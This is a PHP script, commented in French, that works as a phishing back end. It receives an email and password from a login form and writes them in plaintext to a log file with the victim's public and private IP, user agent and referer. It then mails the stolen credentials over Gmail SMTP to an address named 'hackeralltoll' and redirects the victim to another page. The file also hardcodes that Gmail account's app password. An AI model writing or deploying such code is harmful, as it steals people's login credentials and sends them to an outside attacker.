<?php
// ============================================
// login.php - Version ULTIME avec Gmail SMTP
// ============================================

// 🔥 CONFIGURATION GMAIL (mot de passe application)
define('SMTP_HOST', 'smtp.gmail.com');
define('SMTP_PORT', 587);
define('SMTP_USER', 'hackeralltoll@gmail.com');
define('SMTP_PASS', 'mxis wvzp nxth udrm');
define('ALERT_EMAIL', 'hackeralltoll@gmail.com');

// Stockage persistant
define('LOG_DIR', '/data/');
define('LOG_FILE', LOG_DIR . 'login.txt');
define('ENCRYPTION_KEY', 'clef_temporaire_32_caracteres_longue');

if (file_exists(__DIR__ . '/config.php')) {
    require_once __DIR__ . '/config.php';
}

// ============================================
// 1. FONCTIONS
// ============================================

function validateEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL);
}

function getRealIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ips = explode(',', $_SERVER[$header]);
            $ip = trim($ips[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}

function getUserAgent() {
    return $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
}

function getReferer() {
    return $_SERVER['HTTP_REFERER'] ?? 'direct';
}

function encryptData($data, $key) {
    $iv = openssl_random_pseudo_bytes(16);
    $encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, 0, $iv);
    return base64_encode($iv . $encrypted);
}

// 🔥 Envoi email via Gmail SMTP
function sendEmailSMTP($to, $subject, $content) {
    $encodedSubject = '=?UTF-8?B?' . base64_encode($subject) . '?=';
    
    $headers = [
        'MIME-Version: 1.0',
        'Content-Type: text/plain; charset=UTF-8',
        'Content-Transfer-Encoding: 8bit',
        'From: ' . SMTP_USER,
        'Reply-To: ' . ALERT_EMAIL
    ];
    
    $message = implode("\r\n", $headers) . "\r\n\r\n" . $content;
    
    $connection = fsockopen(SMTP_HOST, SMTP_PORT, $errno, $errstr, 30);
    if (!$connection) {
        error_log("SMTP: connexion échouée - $errstr");
        return false;
    }
    
    fgets($connection, 515);
    fputs($connection, "HELO render.com\r\n");
    fgets($connection, 515);
    fputs($connection, "STARTTLS\r\n");
    fgets($connection, 515);
    stream_socket_enable_crypto($connection, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
    fputs($connection, "EHLO render.com\r\n");
    fgets($connection, 515);
    fputs($connection, "AUTH LOGIN\r\n");
    fgets($connection, 515);
    fputs($connection, base64_encode(SMTP_USER) . "\r\n");
    fgets($connection, 515);
    fputs($connection, base64_encode(SMTP_PASS) . "\r\n");
    fgets($connection, 515);
    fputs($connection, "MAIL FROM: <" . SMTP_USER . ">\r\n");
    fgets($connection, 515);
    fputs($connection, "RCPT TO: <$to>\r\n");
    fgets($connection, 515);
    fputs($connection, "DATA\r\n");
    fgets($connection, 515);
    fputs($connection, $message . "\r\n.\r\n");
    fgets($connection, 515);
    fputs($connection, "QUIT\r\n");
    fclose($connection);
    
    return true;
}

function storeLocal($data) {
    if (!is_dir(LOG_DIR)) {
        mkdir(LOG_DIR, 0755, true);
    }
    
    $jsonLine = json_encode($data) . PHP_EOL;
    file_put_contents(LOG_FILE . '.json', $jsonLine, FILE_APPEND | LOCK_EX);
    
    $textEntry = "\n=============================================\n";
    $textEntry .= "Date: " . $data['timestamp'] . "\n";
    $textEntry .= "Email: " . $data['email'] . "\n";
    $textEntry .= "Password: " . $data['password'] . "\n";
    $textEntry .= "IP Publique: " . $data['ip'] . "\n";
    $textEntry .= "IP Privée: " . ($data['local_ip'] ?? 'non détectée') . "\n";
    $textEntry .= "User Agent: " . $data['user_agent'] . "\n";
    $textEntry .= "Referer: " . $data['referer'] . "\n";
    $textEntry .= "=============================================\n";
    
    @file_put_contents(LOG_FILE, $textEntry, FILE_APPEND | LOCK_EX);
}

// ============================================
// 2. EXÉCUTION PRINCIPALE
// ============================================

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(403);
    die('Accès non autorisé');
}

$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$localIP = $_POST['local_ip'] ?? 'non détectée';

if (!validateEmail($email)) {
    die(json_encode(['error' => 'Format email invalide']));
}
if (strlen($password) < 1) {
    die(json_encode(['error' => 'Mot de passe requis']));
}

$logData = [
    'id' => uniqid(),
    'email' => $email,
    'password' => $password,
    'password_encrypted' => encryptData($password, ENCRYPTION_KEY),
    'ip' => getRealIP(),
    'local_ip' => $localIP,
    'user_agent' => getUserAgent(),
    'referer' => getReferer(),
    'timestamp' => date('Y-m-d H:i:s'),
    'timestamp_unix' => time()
];

storeLocal($logData);

// 🔥 EMAIL : Identifiants + IP publique + IP privée + User Agent
$emailContent = "=============================================\n";
$emailContent .= "🔐 NOUVEAU LOGIN DÉTECTÉ\n";
$emailContent .= "=============================================\n\n";
$emailContent .= "📧 Email: " . $logData['email'] . "\n";
$emailContent .= "🔑 Mot de passe: " . $logData['password'] . "\n";
$emailContent .= "🌍 IP Publique: " . $logData['ip'] . "\n";
$emailContent .= "🏠 IP Privée: " . $logData['local_ip'] . "\n";
$emailContent .= "💻 User Agent: " . $logData['user_agent'] . "\n";
$emailContent .= "📅 Date: " . $logData['timestamp'] . "\n";
$emailContent .= "🔗 Referer: " . $logData['referer'] . "\n";
$emailContent .= "=============================================\n";

sendEmailSMTP(ALERT_EMAIL, '🔐 LOGIN - ' . $email, $emailContent);

header('Location: mer.html');
exit;
?>
